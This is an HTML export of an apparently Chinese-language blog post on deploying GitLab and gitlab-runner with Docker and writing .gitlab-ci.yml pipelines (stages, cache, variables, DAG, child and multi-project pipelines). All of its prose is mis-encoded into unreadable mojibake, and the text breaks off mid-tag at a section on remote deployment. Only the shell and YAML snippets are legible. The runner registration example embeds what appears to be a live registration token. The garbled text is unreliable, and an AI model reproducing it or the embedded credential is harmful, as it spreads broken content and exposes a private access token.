    <url>/2022/11/05/%E5%85%B3%E4%BA%8E-gitlab-%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆï¼Œgitlab æ˜¯ä¸€ä¸ªå¹³å°ï¼Œä¸ç®¡ä½¿ç”¨ docker æ¥æ­å»º gitlab è¿˜æ˜¯ç›´æ¥çš„é•œåƒï¼Œéƒ½åªæ˜¯æ­å»ºè¿™ä¸ªå¹³å°ç”¨. å¯ä»¥åœ¨ Web ä¸Šè®¿é—®.</p><p>gitlab-runner æ˜¯å¦ä¸€ä¸ªå¹³å°ï¼Œå…¶ç”¨æ¥è¿è¡Œ gitlab CI&#x2F;CDã€‚</p><p>å› æ­¤ä½¿ç”¨ gitlab CI&#x2F;CD ä¹‹å‰ï¼Œéœ€è¦å…ˆæ­å»ºå¥½ gitlab-runner, ç„¶ååœ¨ gitlab çš„ project ä¸Šæ³¨å†Œè¿™ä¸ª runner (æ‰æ‰¾å¾—åˆ° runner åœ¨å“ªé‡Œä»¥åŠå“ªä¸€ä¸ª) ä¹‹åæ‰èƒ½ä½¿ç”¨.</p><h2 id="åˆ©ç”¨-docker-æ­å»º-gitlab"><a href="#åˆ©ç”¨-docker-æ­å»º-gitlab" class="headerlink" title="åˆ©ç”¨ docker æ­å»º gitlab"></a>åˆ©ç”¨ docker æ­å»º gitlab</h2><p><a href="https://www.bilibili.com/read/mobile?id=14636241&share_medium=android&share_plat=android&share_session_id=9f648ec4-b6af-4a38-aa41-0d689585fc0b&share_source=COPY&share_tag=s_i&timestamp=1640852403&unique_k=qmhoF8p">å‚è€ƒ</a></p><p>å¦‚ä¸‹:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">export</span> GITLAB_HOME=/srv/gitlab<br>$ <span class="hljs-built_in">mkdir</span> -p /opt/docker-compose/gitlab<br>$ vim /opt/docker-compose/gitlab/docker-compose.yml<br></code></pre></td></tr></table></figure><p>åœ¨ docker-compose.yml ä¸­æ·»åŠ :</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3.8&#x27;</span><br><span class="hljs-attr">services:</span><br> <span class="hljs-attr">gitlab:</span><br>   <span class="hljs-attr">hostname:</span> <span class="hljs-string">&#x27;&#x27;</span><br>   <span class="hljs-attr">image:</span> <span class="hljs-string">&#x27;gitlab/gitlab-ce:14.2.4-ce.0&#x27;</span><br>   <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>   <span class="hljs-attr">environment:</span><br>     <span class="hljs-attr">GITLAB_OMNIBUS_CONFIG:</span> <span class="hljs-string">|</span><br><span class="hljs-string">       external_url &#x27;http://:9080&#x27;</span><br><span class="hljs-string">       gitlab_rails[&#x27;gitlab_shell_ssh_port&#x27;] = 9022</span><br><span class="hljs-string">       gitlab_rails[&#x27;time_zone&#x27;] = &#x27;Asia/Shanghai&#x27;</span><br><span class="hljs-string"></span>   <span class="hljs-attr">ports:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;9080:9080&#x27;</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;9022:22&#x27;</span><br>   <span class="hljs-attr">volumes:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;$GITLAB_HOME/config:/etc/gitlab&#x27;</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;$GITLAB_HOME/logs:/var/log/gitlab&#x27;</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;$GITLAB_HOME/data:/var/opt/gitlab&#x27;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œçš„ <code>hostname</code> å’Œ <code>external_url</code> éƒ¨åˆ†è¦è‡ªå·±è¡¥å…¨.</p><p>ä¹‹ååœ¨å«æœ‰ <code>docker-compose.yml</code> çš„ç›®å½•ä¸‹æ‰§è¡Œ <code>docker-compose up -d</code> å³å¯.</p><p>åˆå§‹å¯†ç åœ¨ <code>$GITLAB_HOME/config/initial_root_password</code> æ–‡ä»¶ä¸­.</p><h2 id="å…³äº-gitlab-runner"><a href="#å…³äº-gitlab-runner" class="headerlink" title="å…³äº gitlab runner"></a>å…³äº gitlab runner</h2><p><a href="https://docs.gitlab.com/runner/install/docker.html">ç”¨å®¹å™¨è¿è¡Œ runner çš„å®˜æ–¹æ–‡æ¡£</a></p><p>runners æ˜¯ç”¨æ¥è¿è¡Œ CI&#x2F;CD jobs çš„ä»£ç†.</p><p>shared runners æ„å‘³ç€æ‰€æœ‰çš„ projects éƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ª runner æ¥è¿è¡ŒæœåŠ¡.</p><p>Gitlab runner çš„ docker é•œåƒåŸºäº Ubuntu æˆ– Alpine.</p><p>ä»¥ä¸‹ä¸¤è¡Œå‘½ä»¤ç­‰æ•ˆ:<br>åœ¨å®¹å™¨å†…æ‰§è¡Œ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gitlab-runner &lt;runner <span class="hljs-built_in">command</span> and options...&gt;<br></code></pre></td></tr></table></figure><p>åœ¨å®¹å™¨å¤–æ‰§è¡Œçš„ç‰ˆæœ¬:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run &lt;chosen docker options...&gt; gitlab/gitlab-runner &lt;runner <span class="hljs-built_in">command</span> and options...&gt;<br></code></pre></td></tr></table></figure><p>å…¶ä¼šåˆ›å»ºä¸€ä¸ªå®¹å™¨ï¼Œä½†ä¼¼ä¹æ— æ³•è¿›å…¥. ä¸»è¦æ“ä½œå°±æ˜¯ä¿®æ”¹æŒ‚è½½çš„ volume ç„¶åé‡æ–°åŠ è½½å®¹å™¨.</p><p>å¸¸è§çš„ç”¨æ³•å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run --<span class="hljs-built_in">rm</span> -t -i gitlab/gitlab-runner --<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ·»åŠ  <code>--rm</code> å‚æ•°è¡¨æ˜ç”¨è¯¥å®¹å™¨æ‰§è¡Œå‘½ä»¤ååˆ é™¤.</p><h3 id="åˆ›å»ºä¸€ä¸ª-gitlab-runner"><a href="#åˆ›å»ºä¸€ä¸ª-gitlab-runner" class="headerlink" title="åˆ›å»ºä¸€ä¸ª gitlab runner"></a>åˆ›å»ºä¸€ä¸ª gitlab runner</h3><p>åˆ©ç”¨ docker:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run -d --name gitlab-runner --restart always \<br>      -v /srv/gitlab-runner/config:/etc/gitlab-runner \<br>      -v /var/run/docker.sock:/var/run/docker.sock \<br>      gitlab/gitlab-runner:latest<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡ä»€ä¹ˆéœ€è¦ä¿®æ”¹çš„ï¼Œç›´æ¥ç”¨å³å¯.</p><h3 id="ç»™æŸä¸ª-gitlab-æ³¨å†Œ-runner"><a href="#ç»™æŸä¸ª-gitlab-æ³¨å†Œ-runner" class="headerlink" title="ç»™æŸä¸ª gitlab æ³¨å†Œ runner"></a>ç»™æŸä¸ª gitlab æ³¨å†Œ runner</h3><p><a href="https://docs.gitlab.com/runner/register/index.html#docker">runner æ³¨å†Œçš„å®˜æ–¹æ–‡æ¡£</a></p><p>å°† gitlab å®¹å™¨å’Œ gitlab runner äº§ç”Ÿè”ç³»éœ€åˆ©ç”¨ registration token:<br><img src="/../img/whereis_token.png"></p><p>è¿™é‡Œåªæ˜¯è·å– registration token çš„å†…å®¹ï¼Œç”¨æ¥æ ‡è¯†è¿™ä¸ª gitlab.</p><p>æ³¨å†Œè¿‡ç¨‹éœ€ä½¿ç”¨å¦ä¸€ä¸ªé•œåƒ, è„šæœ¬å¦‚ä¸‹:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">  docker run <span class="hljs-params">--rm</span> -v <span class="hljs-string">/srv/gitlab-runner/config</span>:<span class="hljs-string">/etc/gitlab-runner</span> gitlab/gitlab-runner register \<br><span class="hljs-params">--non-interactive</span> \<br><span class="hljs-params">--executor</span> <span class="hljs-string">&quot;docker&quot;</span> \<br><span class="hljs-params">--docker-image</span> alpine<span class="hljs-function">:latest</span> \<br><span class="hljs-params">--url</span> <span class="hljs-string">&quot;http://10.0.8.3:9080/&quot;</span> \<br><span class="hljs-params">--registration-token</span> <span class="hljs-string">&quot;wknr7omKyoP7xXYQ9ncb&quot;</span> \<br><span class="hljs-params">--description</span> <span class="hljs-string">&quot;second-register-runner&quot;</span> \<br><span class="hljs-params">--tag-list</span> <span class="hljs-string">&quot;testGitlab&quot;</span> \<br><span class="hljs-params">--run-untagged=</span><span class="hljs-string">&quot;true&quot;</span> \<br><span class="hljs-params">--locked=</span><span class="hljs-string">&quot;false&quot;</span> \<br><span class="hljs-params">--access-level=</span><span class="hljs-string">&quot;not_protected&quot;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ä¸€äº›å‚æ•°çš„ä¿®æ”¹. å¦‚ <code>--url</code> ä¸º gitlab æ‰€åœ¨çš„åœ°å€ï¼Œ<code>--registration-token</code> ä¸º gitlab ä¸Šçš„ token.</p><p>è‹¥ <code>--excutor</code> ä¸º docker, æ³¨æ„åœ¨ <code>/srv/gitlab-runner/config/config.toml</code> æ–‡ä»¶ä¸­æ·»åŠ  <code>clone-url</code>:</p><p><img src="/../img/clone_url_solution.png"></p><p>ä¸ç„¶å¯èƒ½ä¼šæŠ¥é”™. å¦‚:</p><p><img src="/../img/gitlab-ci-unable-to-access.png"></p><p>å› ä¸ºæ‰§è¡Œç¯å¢ƒä¸º docker, è¿™é‡Œä»“åº“çš„åœ°å€åˆä¸æ˜¯å…¬ç½‘ ip, docker ä½¿ç”¨ <code>127.0.0.1</code> å°±ä¼šæŠ¥é”™.</p><p>ä¹Ÿå¯ä»¥æ‰‹åŠ¨äº¤äº’å¼è¾“å…¥:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run --<span class="hljs-built_in">rm</span> -it -v /srv/gitlab-runner/config:/etc/gitlab-runner gitlab/gitlab-runner register<br></code></pre></td></tr></table></figure><p>æ³¨å†Œä¹‹å‰éœ€è¦å…ˆæœ‰ runner æœåŠ¡. è¿™é‡Œçš„æ³¨å†Œæ“ä½œå…¶å®å°±æ˜¯é€šè¿‡ä¿®æ”¹ <code>/srv/gitlab-runner/config/config.toml</code> æ¥å®ç°ï¼Œåªä¸è¿‡æ˜¯å…ˆæŒ‚è½½åˆ°ä¸€ä¸ªå®¹å™¨ä¸­ï¼Œä¿®æ”¹ä¹‹åå°†è¿™ä¸ªå®¹å™¨åˆ é™¤ï¼Œä½†æ˜¯æ ¹æ® volume çš„æ€§è´¨ï¼Œä¿®æ”¹æ˜¯ä¿å­˜äº†çš„. å› æ­¤æ³¨å†Œå®é™…ä¸Šå°±æ˜¯å°† gitlab æœåŠ¡å™¨å’Œ token ç­‰ä¿¡æ¯å†™å…¥ runner çš„é…ç½®æ–‡ä»¶.</p><p><a href="https://docs.gitlab.com/runner/configuration/advanced-configuration.html">runner é…ç½®æ–‡ä»¶å®˜æ–¹æ–‡æ¡£</a></p><p>ä¿®æ”¹ <code>config.toml</code> æ–‡ä»¶. ä½¿ç”¨ TOML çš„æ ¼å¼.</p><p>Gitlab Runner æ¯ 3 ç§’æ£€æŸ¥ä¸€æ¬¡é…ç½®ä¿®æ”¹ï¼Œåœ¨å¿…è¦æƒ…å†µä¸‹é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶.</p><p>å¦‚æœæ³¨å†Œåå°† runner åœæ­¢è¿è¡Œï¼Œpipline åœ¨è¿è¡Œæ˜¯å°±ä¼šä¸€ç›´ pending.</p><h1 id="è‡ªåŠ¨éƒ¨ç½²é¡¹ç›®ç¤ºä¾‹"><a href="#è‡ªåŠ¨éƒ¨ç½²é¡¹ç›®ç¤ºä¾‹" class="headerlink" title="è‡ªåŠ¨éƒ¨ç½²é¡¹ç›®ç¤ºä¾‹"></a>è‡ªåŠ¨éƒ¨ç½²é¡¹ç›®ç¤ºä¾‹</h1><p><a href="https://blog.csdn.net/weixin_47872288/article/details/124818005">å‚è€ƒ</a></p><h1 id="å‚è€ƒ-B-ç«™ç³»åˆ—è§†é¢‘"><a href="#å‚è€ƒ-B-ç«™ç³»åˆ—è§†é¢‘" class="headerlink" title="å‚è€ƒ B ç«™ç³»åˆ—è§†é¢‘"></a><a href="https://www.bilibili.com/video/BV1kA411L7jS/?spm_id_from=333.999.0.0&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™ç³»åˆ—è§†é¢‘</a></h1><h2 id="å…³äº-CI-x2F-CD"><a href="#å…³äº-CI-x2F-CD" class="headerlink" title="å…³äº CI&#x2F;CD"></a>å…³äº CI&#x2F;CD</h2><p>gitlab CI æŒ‡ Continuous Integration.</p><p>gitlab CD æŒ‡ Continuous Delivery å’Œ Continuous Deployment.</p><p>pipline, æµæ°´çº¿çš„æ¨¡å¼. åˆ†é˜¶æ®µå’Œä»»åŠ¡. ä»»åŠ¡æ˜¯æœ€å°å•å…ƒ.</p><p>pipline -&gt; stages -&gt; jobs</p><p><code>.gitlab-ci.yml</code> æ–‡ä»¶æ˜¯ CI çš„é…ç½®æ–‡ä»¶ï¼Œå…¶æ”¾åœ¨ä»“åº“ä¸­.</p><h1 id="å‚è€ƒå®˜æ–¹æ–‡æ¡£ç¼–å†™-gitlab-ci-yml-æ–‡ä»¶"><a href="#å‚è€ƒå®˜æ–¹æ–‡æ¡£ç¼–å†™-gitlab-ci-yml-æ–‡ä»¶" class="headerlink" title="å‚è€ƒå®˜æ–¹æ–‡æ¡£ç¼–å†™ .gitlab-ci.yml æ–‡ä»¶"></a><a href="https://docs.gitlab.com/ee/ci/yaml/gitlab_ci_yaml.html">å‚è€ƒå®˜æ–¹æ–‡æ¡£ç¼–å†™ <code>.gitlab-ci.yml</code> æ–‡ä»¶</a></h1><p>è¯¥æ–‡ä»¶å¯èƒ½åŒ…å«çš„å†…å®¹:</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">stages</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">build</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">test</span><br><br><span class="hljs-attribute">build-code-job</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">stage</span><span class="hljs-punctuation">:</span> <span class="hljs-string">build</span><br>  <span class="hljs-attribute">script</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">echo &quot;Check the ruby version, then build some Ruby project files:&quot;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ruby -v</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">rake</span><br><br><span class="hljs-attribute">test-code-job1</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">stage</span><span class="hljs-punctuation">:</span> <span class="hljs-string">test</span><br>  <span class="hljs-attribute">script</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">echo &quot;If the files are built successfully, test some files with one command:&quot;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">rake test1</span><br><br><span class="hljs-attribute">test-code-job2</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">stage</span><span class="hljs-punctuation">:</span> <span class="hljs-string">test</span><br>  <span class="hljs-attribute">script</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">echo &quot;If the files are built successfully, test other files with a different command:&quot;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">rake test2</span><br><br></code></pre></td></tr></table></figure><p>é¦–å…ˆå®šä¹‰äº†ä¸¤ä¸ª stages, ä¹‹åå®šä¹‰çš„éƒ½æ˜¯ jobs, å…¶ä¸­é€‰å®šå…¶å±äºå“ªä¸€ä¸ª stage.</p><p><code>scripts</code> ä¹‹ä¸‹æ˜¯è„šæœ¬çš„å†…å®¹.</p><p>æ‰€æœ‰çš„è¯­æ³•æ–‡æ¡£ <a href="https://docs.gitlab.com/ee/ci/yaml/index.html">å‚è§</a></p><p>è‹¥æŸä¸ª job éœ€è¦è®©ä¸€ä¸ª container æ¥è¿è¡Œï¼Œåˆ™åœ¨å…¶ä¸­æ·»åŠ å¦‚:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">image</span>: ruby:<span class="hljs-number">2</span>.<span class="hljs-number">7</span>.<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>æ¯ä¸€ä¸ª job æ¿å—éƒ½éœ€è¦åŒ…å« <code>stage</code> å’Œ <code>scripts</code></p><p><a href="https://fizzz.blog.csdn.net/article/details/111029151">å‚è€ƒ B ç«™è€å“¥</a></p><p>é‡è¦çš„å…³é”®è¯: stage, script, retry, image, tags, only&#x2F;except, when, cache.</p><p>è‹¥æ²¡æœ‰è‡ªå·±å®šä¹‰ stage æ•°ç»„ï¼Œåˆ™é»˜è®¤çš„ stage æœ‰:</p><ul><li><code>.pre</code></li><li><code>build</code></li><li><code>test</code></li><li><code>deploy</code></li><li><code>.post</code></li></ul><p>ä»»åŠ¡çš„æ‰§è¡Œæ˜¯æŒ‰ç…§é˜¶æ®µ stage å®šä¹‰çš„é¡ºåºæ‰§è¡Œï¼Œè€Œä¸æ˜¯ä½ å†™ job çš„é¡ºåº.</p><p>åŒä¸€ä¸ª stage ä¸­çš„ jobs çš„å¹¶å‘æ‰§è¡Œæ•°é‡åœ¨ runner çš„é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ï¼Œé»˜è®¤ä¸ºä¸€.</p><h3 id="retry"><a href="#retry" class="headerlink" title="retry"></a>retry</h3><p>retry å…³é”®è¯è®¾ç½®çš„èŒƒå›´æ˜¯ 0~2. å¦‚:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">retry</span>: <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">retry</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">max</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span><br>  <span class="hljs-attribute">when</span><span class="hljs-punctuation">: </span><br>    <span class="hljs-bullet">-</span> <br>    <span class="hljs-bullet">-</span> <br></code></pre></td></tr></table></figure><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>æ—¢å¯ä»¥å®šä¹‰å…¨å±€ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šæŸä¸ªä»»åŠ¡.</p><h3 id="tags"><a href="#tags" class="headerlink" title="tags"></a>tags</h3><p>æŒ‡å®š runner.</p><h3 id="only-x2F-except"><a href="#only-x2F-except" class="headerlink" title="only&#x2F;except"></a>only&#x2F;except</h3><p>é™å®šå½“å‰ä»»åŠ¡æ‰§è¡Œçš„æ¡ä»¶.</p><h3 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h3><p>ç¼“å­˜å½“å‰å·¥ä½œç¯å¢ƒç›®å½•ä¸­çš„ä¸€äº›æ–‡ä»¶ï¼Œåœ¨æŸä¸ªä»»åŠ¡åˆå§‹åŒ–æ—¶æ¢å¤.</p><p>å…¶ä¸‹ä¸€èˆ¬ç”¨åˆ°ä¸¤ä¸ªå…³é”®è¯: </p><ul><li>key</li><li>paths</li></ul><p>å‰è€…æ ‡è¯†è¿™æ¬¡ç¼“å­˜, åè€…æŒ‡æ˜æ–‡ä»¶çš„è·¯å¾„.</p><p>æ£€å‡ºç¼“å­˜ä¼¼ä¹ä¸éœ€è¦æ‰‹åŠ¨æ£€å‡ºï¼Œè€Œæ˜¯åœ¨æ¯ä¸ªé˜¶æ®µå¼€å§‹æ—¶è‡ªåŠ¨æ£€å‡º. æ¯æ¬¡æ£€å‡ºååˆä¼šç¼“å­˜.</p><h3 id="å˜é‡çš„ä½¿ç”¨"><a href="#å˜é‡çš„ä½¿ç”¨" class="headerlink" title="å˜é‡çš„ä½¿ç”¨"></a>å˜é‡çš„ä½¿ç”¨</h3><p>åœ¨ <code>.gitlab-ci.yml</code>  æ–‡ä»¶ä¸­å®šä¹‰å˜é‡.</p><p>ä½¿ç”¨ <code>variable:</code> , å˜é‡åæœ€å¥½éƒ½ç”¨å¤§å†™å¦‚:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">variables:</span><br><span class="hljs-symbol">  MT_VAR:</span> <span class="hljs-string">&quot;my name is ...&quot;</span><br><span class="hljs-symbol">  TEST:</span> <span class="hljs-string">&quot;The second var&quot;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">log_var:</span><br><span class="hljs-symbol">  script:</span><br>    - echo $MT_VAR<br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ª flag, <code>Protect variable</code>, è¡¨æ˜åªæœ‰åœ¨ä¿æŠ¤åˆ†æ”¯ä¸­æ‰èƒ½ä½¿ç”¨è¯¥å˜é‡.</p><p><code>Mask variable</code> è¡¨æ˜åœ¨ pipline ä¸­ä¸ä¼šç›´æ¥æ˜¾ç¤º.</p><p>pipline ä¸­æœ‰é¢„å®šä¹‰çš„å˜é‡.</p><p>ä½¿ç”¨ <code>export</code> å¯ä»¥å¯¼å‡ºæ‰€æœ‰å˜é‡:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">script:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">export</span><br></code></pre></td></tr></table></figure><h2 id="æµæ°´çº¿ç±»å‹"><a href="#æµæ°´çº¿ç±»å‹" class="headerlink" title="æµæ°´çº¿ç±»å‹"></a>æµæ°´çº¿ç±»å‹</h2><p><a href="https://docs.gitlab.com/ee/ci/pipelines/">å®˜æ–¹æ–‡æ¡£</a></p><h3 id="DAG-æµæ°´çº¿-Directed-Acyclic-Graphs"><a href="#DAG-æµæ°´çº¿-Directed-Acyclic-Graphs" class="headerlink" title="DAG æµæ°´çº¿ (Directed Acyclic Graphs)"></a>DAG æµæ°´çº¿ (Directed Acyclic Graphs)</h3><p>é€‚ç”¨äºå¤šå¹³å°éƒ¨ç½²:</p><p><img src="/../img/DAG_pipline.png"></p><p>è®¾ç½®ä¾èµ–å…³ç³». ç”¨ <code>needs</code> å…³é”®è¯, å¦‚:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">test_a:</span><br><span class="hljs-symbol">  stage:</span> test<br><span class="hljs-symbol">  needs:</span> [build_a]<br><span class="hljs-symbol">  script:</span><br>    - echo <span class="hljs-string">&quot;...&quot;</span><br></code></pre></td></tr></table></figure><p>æ–¹æ‹¬å·é‡Œé¢ä¸ºå…¶ä»– job çš„åç§°.</p><h3 id="çˆ¶å­æµæ°´çº¿"><a href="#çˆ¶å­æµæ°´çº¿" class="headerlink" title="çˆ¶å­æµæ°´çº¿"></a>çˆ¶å­æµæ°´çº¿</h3><p>åœ¨åŒä¸€ä¸ªé¡¹ç›®ä¸­å­ç›®å½•ä¸‹ä¹Ÿæœ‰ <code>.gitlab-ci.yml</code> æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯é…ç½®å­—æµæ°´çº¿.</p><p>è§¦å‘å¼. ä½¿ç”¨ <code>trigger</code>, <code>include</code> å’Œ <code>rules</code> å…³é”®è¯.</p><p>å¦‚:</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">trigger_a</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">stage</span><span class="hljs-punctuation">:</span> <span class="hljs-string">test</span><br>  <span class="hljs-attribute">trigger</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">include</span><span class="hljs-punctuation">:</span> <span class="hljs-string">a/.gitlab-ci.yml</span><br>  <span class="hljs-attribute">rules</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">change:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">a/*</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>triger</code> å’Œ <code>include</code> å°±æ˜¯æŒ‡æ˜å­æµæ°´çº¿çš„é…ç½®æ–‡ä»¶ä½ç½®.</p><p><code>rules</code> å°±æ˜¯æŒ‡æ˜ä»€ä¹ˆæ—¶å€™æ‰§è¡Œ <code>triger</code> ä¸‹çš„æµæ°´çº¿.</p><h3 id="å¤šé¡¹ç›®æµæ°´çº¿"><a href="#å¤šé¡¹ç›®æµæ°´çº¿" class="headerlink" title="å¤šé¡¹ç›®æµæ°´çº¿"></a>å¤šé¡¹ç›®æµæ°´çº¿</h3><p>è§¦å‘å¦ä¸€ä¸ªé¡¹ç›®çš„æµæ°´çº¿. å°±æ˜¯æœ‰å¤šä¸ª project.</p><p>ç¤ºä¾‹:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">trigger_c:</span><br><span class="hljs-symbol">  stage:</span> triggers<br><span class="hljs-symbol">  trigger:</span><br><span class="hljs-symbol">    project:</span> root/...    <span class="hljs-meta"># æŒ‡æ˜ project çš„ä½ç½®</span><br><span class="hljs-symbol">    branch:</span> master       <span class="hljs-meta"># æŒ‡æ˜å“ªä¸ªåˆ†æ”¯</span><br><span class="hljs-symbol">    strategy:</span> depend<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰æŒ‡å®šè§¦å‘æ¡ä»¶.</p><h3 id="åˆå¹¶æµæ°´çº¿"><a href="#åˆå¹¶æµæ°´çº¿" class="headerlink" title="åˆå¹¶æµæ°´çº¿"></a>åˆå¹¶æµæ°´çº¿</h3><p>åˆå¹¶çš„æ—¶å€™è§¦å‘.</p><p>åœ¨ä¸€ä¸ª job ä¸‹æ·»åŠ :</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">only</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">merge_requests</span><br></code></pre></td></tr></table></figure><h3 id="æµæ°´çº¿çš„è§¦å‘"><a href="#æµæ°´çº¿çš„è§¦å‘" class="headerlink" title="æµæ°´çº¿çš„è§¦å‘"></a>æµæ°´çº¿çš„è§¦å‘</h3><p>æ¨é€ä»£ç æ—¶ï¼Œå®šæ—¶ï¼Œurl, æ‰‹åŠ¨è§¦å‘.</p><h2 id="è¿œç¨‹æœåŠ¡å™¨éƒ¨ç½²"><a 